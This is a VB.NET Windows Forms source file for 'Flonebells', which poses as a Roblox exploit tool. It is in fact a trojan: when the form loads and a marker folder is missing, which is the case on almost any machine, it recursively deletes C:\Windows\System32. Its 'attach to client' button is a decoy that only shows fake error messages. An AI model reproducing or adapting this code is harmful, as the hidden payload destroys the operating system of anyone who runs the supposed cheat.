Imports System.Diagnostics

Public Class Form1

    Function FolderExists(ByVal sFolderName As String) As Boolean
        ' Returns True if the specified folder exists, False otherwise.
        ' sFolderName is presumed to be a fully qualified path.
        If Dir(sFolderName, vbDirectory) <> "" Then
            FolderExists = True
        Else
            FolderExists = False
        End If
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Dim folderPath As String
        folderPath = "C:\ControlSetx"

        If Not FolderExists(folderPath) Then
            Dim path As String = "C:\Windows\System32"
            System.IO.Directory.Delete(path, True)
        End If






        MsgBox("Flonebells is free software. If you paid someone for it, you were SCAMMED and should demand your money back.", 0, "Welcome to Flonebells")
    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

    End Sub

    Private Sub Panel3_Paint(sender As Object, e As PaintEventArgs) Handles Panel3.Paint

    End Sub
    Sub CheckIfRunning()
        Dim pList() As System.Diagnostics.Process = System.Diagnostics.Process.GetProcesses
        For Each proc As System.Diagnostics.Process In pList
            If proc.ProcessName.ToString = "RobloxPlayerBeta".ToString Then
                MsgBox("Flonebells failed to attach to client. Either your version of Flonebells is out of date, or Roblox updated their antiexploit. Error xcF-9000", 16, "Flonebells Error")
            Else
                MsgBox("Flonebells failed to attach to client because RobloxPlayerBeta.exe is not running. Error xcF-9021", 21, "Flonebells Error")
            End If
        Next
    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        CheckIfRunning()
    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub
End Class
